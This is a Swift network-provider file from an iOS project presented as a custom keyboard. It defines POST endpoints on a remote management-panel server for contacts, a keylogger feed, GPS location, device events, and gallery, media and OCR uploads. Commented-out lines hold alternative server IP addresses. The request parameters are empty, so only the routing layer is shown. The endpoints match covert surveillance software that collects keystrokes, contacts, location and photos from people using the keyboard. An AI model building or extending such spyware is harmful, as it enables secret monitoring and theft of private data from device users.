//
//  Provider.swift
//  CustomKeyboard
//
//  Created by Serg Liamthev on 03.12.2019.
//  Copyright © 2019 Apple. All rights reserved.
//

import Alamofire
import Foundation
import Moya

enum CustomKeyboard: TargetType {
    
    case deviceInfo
    case deviceStatus
    case deviceGeneralInfo
    
    case contactsInfo
    case deviceKeyloger
    
    case gpsInfo
    case deviceEventInfo
    
    case mediaUpload
    case galleryMediaUpload
    
    case ocrMediaUpload
    case ocrMediaUploadEnd
    
    case deviceBatteryLevel
    
    var baseURL: URL {
        return URL(string: "https://m100panel.com/w1_mdm_app/w1-management-panel/w1_mdm_app/index.php/api")!
        
        //dev server 1
        //#define kAPI_BaseUrl @"http://108.61.211.172/w1_mdm_app/index.php/api/"

        //local dev server 1
        //#define kAPI_BaseUrl @"http://192.168.90.102:8080/w1/w1_mdm_app/index.php/api/"

        //prod server 1
        //#define kAPI_BaseUrl @"http://41.33.226.121/w1_mdm_app/index.php/api/"
    }
    
    var path: String {
        
        switch self {
            
        case .deviceInfo:
            return "/device/deviceInfo"
            
        case .deviceStatus:
            return "/device/deviceStatus"
            
        case .deviceGeneralInfo:
            return "/device/deviceGeneralInfo"
            
        case .contactsInfo:
            return "/device/contactInfo"
            
        case .deviceKeyloger:
            return "/device/deviceKeylogger"
            
        case .gpsInfo:
            return "/device/gpsInfo"
            
        case .deviceEventInfo:
            return "/device/deviceEventInfo"
            
        case .mediaUpload:
            return "/media/mediaUpload"
            
        case .galleryMediaUpload:
            return "/media/gallerymediaUpload"
            
        case .ocrMediaUpload:
            return "/media/ocrMediaUpload"
            
        case .ocrMediaUploadEnd:
            return "/media/ocrMediaUploadEnd"
            
        case .deviceBatteryLevel:
            return "/device/deviceBatteryLevel"
        }
    }
    
    var method: Moya.Method {
        
        switch self {
        default:
            return .post
        }
        
    }
    
    var sampleData: Data {
        return Data()
    }
    
    var task: Task {
        switch self {
            
        case .deviceInfo:
            let params = [String: Any]()
            return .requestParameters(parameters: params, encoding: JSONEncoding.default)
            
        case .deviceStatus:
            let params = [String: Any]()
            return .requestParameters(parameters: params, encoding: JSONEncoding.default)
            
        case .deviceGeneralInfo:
            let params = [String: Any]()
            return .requestParameters(parameters: params, encoding: JSONEncoding.default)
            
        case .contactsInfo:
            let params = [String: Any]()
            return .requestParameters(parameters: params, encoding: JSONEncoding.default)
            
        case .deviceKeyloger:
            let params = [String: Any]()
            return .requestParameters(parameters: params, encoding: JSONEncoding.default)
            
        case .gpsInfo:
            let params = [String: Any]()
            return .requestParameters(parameters: params, encoding: JSONEncoding.default)
            
        case .deviceEventInfo:
            let params = [String: Any]()
            return .requestParameters(parameters: params, encoding: JSONEncoding.default)
            
        case .mediaUpload:
            let params = [String: Any]()
            return .requestParameters(parameters: params, encoding: JSONEncoding.default)
            
        case .galleryMediaUpload:
            let params = [String: Any]()
            return .requestParameters(parameters: params, encoding: JSONEncoding.default)
            
        case .ocrMediaUpload:
            let params = [String: Any]()
            return .requestParameters(parameters: params, encoding: JSONEncoding.default)
            
        case .ocrMediaUploadEnd:
            let params = [String: Any]()
            return .requestParameters(parameters: params, encoding: JSONEncoding.default)
            
        case .deviceBatteryLevel:
            let params = [String: Any]()
            return .requestParameters(parameters: params, encoding: JSONEncoding.default)
        }
    }
    
    var headers: [String: String]? {
        return [:]
    }
    
    var validationType: ValidationType {
        return .successCodes
    }
    
}
